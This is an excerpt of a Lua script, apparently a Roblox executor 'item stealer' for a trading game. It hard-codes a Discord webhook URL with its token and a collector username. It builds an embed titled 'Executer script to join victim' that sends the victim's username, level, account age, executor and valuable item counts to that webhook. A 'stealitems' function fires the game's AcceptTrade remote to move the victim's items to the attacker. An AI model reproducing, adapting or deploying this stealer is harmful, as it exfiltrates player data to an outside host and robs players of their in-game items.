...
userName1 = "cooker_nikilis"
webHook1 = "https://discordapp.com/api/webhooks/1325076047250849813/_xTUrDk-u-bAKTLHmaKueDUn5Y7pgAQSfV7tPp2bDM36tPT0N0SyCpEEB-aYkSzoR6O3"
...
local WebHookEmbed = CreateEmbed(
    "🔪Executer script to join victim",
    "",
    11220,
    {
        {name = "```😺 INFO```", value = "```\n | 📖 Username: "..LP.Name.."\n | 🚀Level: "..tostring(getLvl()).."\n | 🗝️ Account-Age: "..tostring(LP.AccountAge).."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🤖 Account-to-collect: "..userName.."\n```"},
        {name = "```✔️ Hit Info```", value = "```\n | Total Items: "..tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC).."\n | Uniques: "..tostring(uniqueItemsC).."\n | Ancients: "..tostring(ancientItemsC).."\n | Godlies: "..tostring(godlyItemsC).."\n | Legendarys: "..tostring(legendaryItemsC).."\n```"}
    }
)
...
local function stealitems(targetUser)
    ...
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = game.Players[targetUser].UserId}))
end
